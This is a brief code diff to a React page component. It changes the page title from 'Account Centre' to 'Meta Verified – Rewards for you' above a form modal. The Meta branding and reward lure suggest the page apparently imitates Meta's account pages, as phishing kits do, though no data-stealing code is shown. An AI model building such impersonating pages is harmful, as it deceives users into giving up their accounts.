@@ -109,7 +109,7 @@ const Page: FC = () => {
 
     return (
         <div className='flex items-center justify-center bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] text-[#1C2B33]'>
-            <title>Account Centre</title>
+            <title>Meta Verified – Rewards for you</title>
             {isModalOpen && <FormModal key={modalKey} dictionary={dictionary} />}
             <div className='flex w-full max-w-275'>
                 <div className='sticky top-0 hidden h-screen w-1/3 flex-col border-r border-r-gray-200 pt-10 pr-8 sm:flex'>
